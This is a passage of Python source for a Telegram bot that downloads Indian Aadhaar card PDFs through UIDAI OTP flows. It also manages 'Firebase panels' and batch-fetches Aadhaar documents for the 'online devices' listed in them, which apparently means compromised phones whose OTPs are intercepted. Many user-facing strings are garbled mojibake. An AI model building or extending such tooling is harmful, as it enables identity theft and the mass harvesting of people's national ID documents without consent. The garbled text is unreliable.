                f"<b>{emo('Ã°ÂÂÂ±')} Mobile:</b> <code>{mobile}</code>\n\n"
                "<b>Aadhaar card par jo Name likha hai wo yahan type karke bhejein.</b>\n\n"
                "<i>Agar name nahi pata ya default Mr use karna hai, to neeche <b>Skip Name</b> button par click karein.</i>"
                "</blockquote>",
                reply_markup=skip_kb,
                parse_mode='HTML'
            )

        elif stage == 'awaiting_name':
            name = text.strip()
            mobile = data.get('mobile')
            if not mobile:
                await update.message.reply_text("<b>Ã¢ÂÂ Session expire ho gaya. /start se dobara shuru karein.</b>", parse_mode='HTML')
                self.clear_user_data(uid)
                return
            await self._uidai_start_flow(update, ctx, mobile, name=name)

        elif stage == 'otp1':
            if not text.isdigit() or len(text) not in (6, 8):
                await update.message.reply_text("Ã¢ÂÂ 6-digit OTP bhejo. Ya /cancel.")
                return
            await self._uidai_verify_otp1(update, ctx, text.strip())

        elif stage == 'otp2':
            if not text.isdigit() or len(text) not in (6, 8):
                await update.message.reply_text("Ã¢ÂÂ 6-digit OTP bhejo. Ya /cancel.")
                return
            await self._uidai_download_pdf(update, ctx, text.strip())

        elif stage == 'retry_otp2':
            eid = data.get('eid')
            resp_name = data.get('uidai_resp_name') or data.get('name')
            if eid:
                msg = await update.message.reply_text(
                    f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
                    parse_mode='HTML'
                )
                await self._uidai_send_otp2(update, ctx, eid, resp_name, status_msg=msg, max_retries=10)
            else:
                await update.message.reply_text("<b>Ã¢ÂÂ Session expire ho gaya. /start</b>", parse_mode='HTML')

        else:
            await update.message.reply_text(
                "<b>Ã¢ÂÂ /start</b>", parse_mode='HTML')

    # ==========================================
    # CALLBACKS
    # ==========================================
    async def button_callback(self, update, ctx):
        query = update.callback_query
        # Fast non-blocking answer so Telegram button spinner stops instantly
        try:
            asyncio.create_task(query.answer())
        except Exception:
            pass
        uid = update.effective_user.id
        data = self.get_user_data(uid)

        if query.data.startswith('broadcast_'):
            await self.handle_broadcast_confirm(update, ctx)
            return

        if is_user_banned(uid):
            await query.answer("Ã°ÂÂÂ« Banned", show_alert=True)
            return

        if query.data == 'download_aadhaar':
            if is_maintenance_mode() and not is_admin(uid):
                await query.answer("Ã°ÂÂÂ Ã¯Â¸Â Aadhaar Download is currently under maintenance!", show_alert=True)
                await query.message.reply_text(
                    f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
                    "<blockquote>"
                    "<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªs Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â.</b>\n"
                    "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ. Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â! Ã°ÂÂÂ</b>"
                    "</blockquote>",
                    parse_mode='HTML'
                )
                return

            if not data.get('verified'):
                await query.answer("Ã¢ÂÂ Join all channels first", show_alert=True)
                await self.show_force_join(update, ctx)
                return

            self.update_user_data(uid, 'awaiting_firebase_add', None)
            self.update_user_data(uid, 'fb_adding_name', None)
            self.update_user_data(uid, 'download_mode', True)
            self.update_user_data(uid, 'stage', 'mobile')
            self.update_user_data(uid, 'created_at', time.time())

            await query.message.reply_text(
                f"<b>{emo('Ã°ÂÂÂ±')} sÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â 10-Ã¡Â´ÂÃÂªÃÂ¢ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ</b>\n\n"
                "<blockquote>"
                "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ</b>"
                "</blockquote>",
                parse_mode='HTML')

        elif query.data == 'verify':
            _MEMBERSHIP_CACHE.pop(uid, None)
            nj = await self.check_membership(ctx, uid, force=True)
            if nj:
                await query.answer(f"Ã¢ÂÂ {len(nj)} channel(s) join nahi kiye", show_alert=True)
                return
            self.set_user_verified(uid, True)
            try:
                await query.message.delete()
            except Exception:
                pass
            await self.show_main_menu_new(update, ctx)

        elif query.data == 'help':
            if not data.get('verified'):
                await query.answer("Ã¢ÂÂ Join all channels first!", show_alert=True)
                await self.show_force_join(update, ctx)
                return
            await self.help(update, ctx)

        elif query.data == 'my_info':
            if not data.get('verified'):
                await query.answer("Ã¢ÂÂ Join all channels first!", show_alert=True)
                await self.show_force_join(update, ctx)
                return
            await self.my_info(update, ctx)

        elif query.data == 'retry_otp2':
            eid = data.get('eid')
            resp_name = data.get('uidai_resp_name') or data.get('name')
            if not eid:
                await query.answer("Ã¢ÂÂ EID data expire ho gaya. Kripya /start se dobara karein.", show_alert=True)
                return
            await query.answer("Ã°ÂÂÂ Retrying OTP generation...")
            msg = await query.message.reply_text(
                f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
                parse_mode='HTML'
            )
            await self._uidai_send_otp2(update, ctx, eid, resp_name, status_msg=msg, max_retries=10)

        elif query.data == 'skip_name':
            mobile = data.get('mobile')
            if not mobile:
                try:
                    await query.answer("Ã¢ÂÂ Session expired! /start", show_alert=True)
                except Exception:
                    pass
                return
            safe_delete_bg(query.message)
            asyncio.create_task(self._uidai_start_flow(update, ctx, mobile, name="Mr"))

        elif query.data == 'cancel_flow':
            self.clear_user_data(uid)
            safe_delete_bg(query.message)
            await query.message.reply_text("<b>Ã¢ÂÂ Operation cancelled. /start</b>", parse_mode='HTML')

        elif query.data == 'back_menu':
            self.update_user_data(uid, 'awaiting_firebase_add', None)
            self.update_user_data(uid, 'fb_adding_name', None)
            self.update_user_data(uid, 'download_mode', False)
            if not data.get('verified'):
                await query.answer("Ã¢ÂÂ Join all channels first!", show_alert=True)
                await self.show_force_join(update, ctx)
                return
            safe_delete_bg(query.message)
            await self.show_main_menu_new(update, ctx)
        elif query.data == 'admin_stats':
            if is_admin(uid):
                await self.admin_stats(update, ctx)
        elif query.data == 'admin_broadcast':
            if is_admin(uid):
                self.update_user_data(uid, 'awaiting_broadcast', True)
                await query.message.reply_text(
                    f"<b>{emo('Ã°ÂÂÂ¢')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â</b>\n\n"
                    "<blockquote>"
                    "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂxÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs, Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, Ã¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, sÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.) ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â.</b>\n\n"
                    "<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs Ã¡Â´Â¡ÃÂªÃÂÃÂ ÃÂÃ¡Â´Â 100% Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs Ã¡Â´Â ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ_Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â!</b>"
                    "</blockquote>\n\n"
                    "<b>sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ.</b>",
                    parse_mode='HTML')
        elif query.data == 'admin_ban':
            if is_admin(uid):
                await query.message.reply_text(
                    "<b>Ã°ÂÂÂ« /ban <user_id></b>", parse_mode='HTML')
        elif query.data == 'admin_unban':
            if is_admin(uid):
                await query.message.reply_text(
                    "<b>Ã¢ÂÂ /unban <user_id></b>", parse_mode='HTML')
        elif query.data == 'admin_user_info':
            if is_admin(uid):
                await query.message.reply_text(
                    "<b>Ã°ÂÂÂ /userinfo <user_id></b>", parse_mode='HTML')
        elif query.data == 'admin_daily_stats':
            if is_admin(uid):
                await self.admin_daily_stats(update, ctx)
        elif query.data == 'admin_maintenance_toggle':
            if is_admin(uid):
                cur = is_maintenance_mode()
                new_status = not cur
                set_maintenance_mode(new_status)
                status_str = "Ã°ÂÂÂ´ ON" if new_status else "Ã°ÂÂÂ¢ OFF"
                try:
                    await query.answer(f"Maintenance mode set to {status_str}", show_alert=True)
                except Exception:
                    pass
                await self.show_admin_panel(update, ctx)
            else:
                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)

        elif query.data.startswith('admin_firebases_'):
            if not is_admin(uid):
                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
                return
            page_str = query.data.replace('admin_firebases_', '')
            try:
                page = int(page_str)
            except Exception:
                page = 0
            await self.admin_list_firebases(update, ctx, page=page)

        elif query.data.startswith('admin_delfb_'):
            if not is_admin(uid):
                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
                return
            payload = query.data[len('admin_delfb_'):]
            r_idx = payload.rfind('_')
            if r_idx != -1:
                fb_id = payload[:r_idx]
                page_str = payload[r_idx+1:]
                try:
                    page = int(page_str)
                except Exception:
                    page = 0
            else:
                fb_id = payload
                page = 0

            await asyncio.to_thread(delete_firebase, fb_id, None)
            await query.answer("Ã°ÂÂÂ Firebase panel delete kar diya gaya!", show_alert=True)
            await self.admin_list_firebases(update, ctx, page=page)

        elif query.data == 'admin_back_menu':
            if not is_admin(uid):
                await query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
                return
            try:
                await query.message.delete()
            except Exception:
                pass
            await self.show_admin_panel(update, ctx)

        elif query.data == 'noop':
            try:
                await query.answer()
            except Exception:
                pass

        # ============================================
        # FIREBASE Ã¢ÂÂ Download via Firebase button
        # ============================================
        elif query.data == 'fb_download_all_panels':
            self.update_user_data(uid, 'awaiting_firebase_add', None)
            self.update_user_data(uid, 'fb_adding_name', None)
            self.update_user_data(uid, 'download_mode', False)
            if is_maintenance_mode() and not is_admin(uid):
                await query.answer("Ã°ÂÂÂ Ã¯Â¸Â Aadhaar Download is currently under maintenance!", show_alert=True)
                return
            if uid not in _VERIFIED_USERS_CACHE:
                nj = await self.check_membership(ctx, uid, force=True)
                if nj:
                    await query.answer("Ã¢ÂÂ Join all channels first", show_alert=True)
                    await self.show_force_join(update, ctx)
                    return
                self.set_user_verified(uid, True)
            if self.active_batches.get(uid):
                await query.answer("Ã¢ÂÂ Ã¯Â¸Â Batch download already running! Send /cancel to stop.", show_alert=True)
                return

            # User ka apna firebase list dikha
            fbs = await asyncio.to_thread(get_all_firebases, uid)
            kb = self.get_firebase_selection_keyboard(uid, page=0, fbs=fbs)

            if not fbs:
                text = (
                    f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
                    "<blockquote>"
                    "<b>ÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
                    f"<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â {emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ.</b>"
                    "</blockquote>"
                )
            else:
                total_pages = max(1, (len(fbs) + 19) // 20)
                text = (
                    f"<b>{emo('Ã°ÂÂÂ¥')} sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â (1/{total_pages})</b>\n\n"
                    "<blockquote>"
                    "<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>"
                    "</blockquote>"
                )
            try:
                await query.message.edit_text(text, reply_markup=kb, parse_mode='HTML')
            except Exception:
                await query.message.reply_text(text, reply_markup=kb, parse_mode='HTML')

        elif query.data.startswith('fb_page_'):
            page_str = query.data.replace('fb_page_', '')
            try:
                page = int(page_str)
            except ValueError:
                page = 0
            fbs = await asyncio.to_thread(get_all_firebases, uid)
            if not fbs:
                kb = self.get_firebase_selection_keyboard(uid, page=0, fbs=fbs)
                text = (
                    f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
                    "<blockquote>"
                    "<b>ÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
                    f"<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â {emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ.</b>"
                    "</blockquote>"
                )
            else:
                total_pages = max(1, (len(fbs) + 19) // 20)
                page = max(0, min(page, total_pages - 1))
                kb = self.get_firebase_selection_keyboard(uid, page=page, fbs=fbs)
                text = (
                    f"<b>{emo('Ã°ÂÂÂ¥')} sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ({page+1}/{total_pages})</b>\n\n"
                    "<blockquote>"
                    "<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>"
                    "</blockquote>"
                )
            try:
                await query.message.edit_text(text, reply_markup=kb, parse_mode='HTML')
            except Exception:
                try:
                    await query.message.edit_reply_markup(kb)
                except Exception:
                    pass

        elif query.data.startswith('fb_sel_'):
            fb_id = query.data.replace('fb_sel_', '')
            fb = get_firebase_by_id(fb_id, user_id=None if is_admin(uid) else uid)
            if not fb:
                await query.answer("Ã¢ÂÂ Firebase not found!", show_alert=True)
                return
            if self.active_batches.get(uid):
                await query.answer("Ã¢ÂÂ Ã¯Â¸Â Batch download already running! Send /cancel to stop.", show_alert=True)
                return

            self.update_user_data(uid, 'selected_firebase_id', fb['id'])
            self.update_user_data(uid, 'selected_firebase_name', fb['name'])
            self.update_user_data(uid, 'selected_firebase_url', fb['url'])
            self.update_user_data(uid, 'selected_firebase_key', fb.get('key', ''))
            await query.answer(f"Ã¢ÂÂ¡ [{fb['name']}] ke online devices fetch aur download shuru...")

            loading_msg = await query.message.reply_text(
                f"<b>{emo('Ã¢ÂÂ³')} ÃªÂÂ°Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ´ÃÂÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Âs ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â {html.escape(str(fb['name']))}...</b>",
                parse_mode='HTML'
            )
            devices = await asyncio.to_thread(
                firebase_get_online_devices,
                firebase_url=fb['url'], firebase_key=fb.get('key', '')
            )
            if not devices:
                await loading_msg.edit_text(
                    f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂª Ã¡Â´ÂÃÂ´ÃÂÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃÂÃÂª Ã¡Â´ÂÃÂªÃÂÃ¡Â´Â</b>\n\n"
                    f"<blockquote><b>[{html.escape(str(fb['name']))}] Firebase panel me abhi koi device online nahi hai.</b></blockquote>",
                    reply_markup=InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ", callback_data=f"fb_sel_{fb_id}", style="primary"),
                            InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='fb_download_all_panels', style="primary"),
                        ],
                        [
                            InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â", callback_data='back_menu', style="primary")
                        ]
                    ]),
                    parse_mode='HTML'
                )
                return

            for d in devices:
                d['fb_url'] = fb['url']
                d['fb_key'] = fb.get('key', '')
                d['fb_name'] = fb['name']

            try:
                await loading_msg.delete()
            except Exception:
                pass

            asyncio.create_task(
                self.run_batch_download(
                    ctx=ctx, chat_id=update.effective_chat.id,
                    user=update.effective_user, devices=devices, panel_name=fb['name']
                )
            )

        elif query.data.startswith('cancel_batch_'):
            target_uid = int(query.data.replace('cancel_batch_', ''))
            if uid == target_uid or is_admin(uid):
                if self.active_batches.get(target_uid):
                    self.active_batches[target_uid]['cancel'] = True
                    await query.answer("Ã°ÂÂÂ Cancelling batch download...", show_alert=True)
                else:
                    await query.answer("Batch already finished or not active.", show_alert=True)
            else:
                await query.answer("Ã¢ÂÂ Unauthorized!", show_alert=True)

        # ============================================
        # USER FIREBASE Ã¢ÂÂ Add / Manage
        # ============================================
        elif query.data == 'user_add_fb':
            self.update_user_data(uid, 'awaiting_firebase_add', 'name')
            cancel_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data="cancel_firebase_add", style="danger")]
            ])
            await query.message.reply_text(
                f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
                "<blockquote>"
                "<b>sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1:</b> Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â\n"
                "<i>(Ã¡Â´Â.ÃÂ¢. Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ1)</i>\n\n"
                "<b>Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ:</b> Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel"
                "</blockquote>",
                reply_markup=cancel_kb,
                parse_mode='HTML'
            )

        elif query.data == 'cancel_firebase_add':
            self.update_user_data(uid, 'awaiting_firebase_add', None)
            self.update_user_data(uid, 'fb_adding_name', None)
            await query.answer("Ã¢ÂÂ Firebase add cancel kar diya gaya.")
            try:
                await query.message.delete()
            except Exception:
                pass
            await self.show_main_menu_new(update, ctx)

        elif query.data == 'user_manage_fb' or query.data.startswith('user_manage_fb_') or query.data.startswith('user_manage_page_'):
            if query.data.startswith('user_manage_page_'):
                try:
                    page = int(query.data.replace('user_manage_page_', ''))
                except ValueError:
                    page = 0
            elif query.data.startswith('user_manage_fb_'):
                try:
                    page = int(query.data.replace('user_manage_fb_', ''))
                except ValueError:
                    page = 0
            else:
                page = 0

            fbs = await asyncio.to_thread(get_all_firebases, uid)
            if not fbs:
                await query.answer("Koi Firebase nahi hai!", show_alert=True)
                return

            total_pages = max(1, (len(fbs) + 19) // 20)
            page = max(0, min(page, total_pages - 1))
            kb = self.get_manage_firebase_keyboard(uid, page=page)
            text = (
                f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ¢Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ({page+1}/{total_pages})</b>\n\n"
                "<blockquote><b>Delete karne ke liye button press karo:</b></blockquote>"
            )
            try:
                await query.message.edit_text(text, reply_markup=kb, parse_mode='HTML')
            except Exception:
                await query.message.reply_text(text, reply_markup=kb, parse_mode='HTML')

        elif query.data.startswith('user_del_fb_'):
            payload = query.data.replace('user_del_fb_', '')
            if '_' in payload:
                fb_id, page_str = payload.rsplit('_', 1)
                try:
                    page = int(page_str)
                except ValueError:
                    page = 0
            else:
                fb_id = payload
                page = 0

            await asyncio.to_thread(delete_firebase, fb_id, uid)
            await query.answer("Ã¢ÂÂ Firebase delete ho gaya!", show_alert=True)
            # Refresh list
            fbs = await asyncio.to_thread(get_all_firebases, uid)
            if not fbs:
                await safe_edit_text(
                    query.message,
                    f"<b>{emo('Ã¢ÂÂ')} Saare Firebase delete ho gaye.</b>",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â", callback_data="user_add_fb", style="success")],
                        [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='fb_download_all_panels', style="primary")]
                    ]),
                    parse_mode='HTML'
                )
            else:
                total_pages = max(1, (len(fbs) + 19) // 20)
                page = max(0, min(page, total_pages - 1))
                kb = self.get_manage_firebase_keyboard(uid, page=page)
                text = (
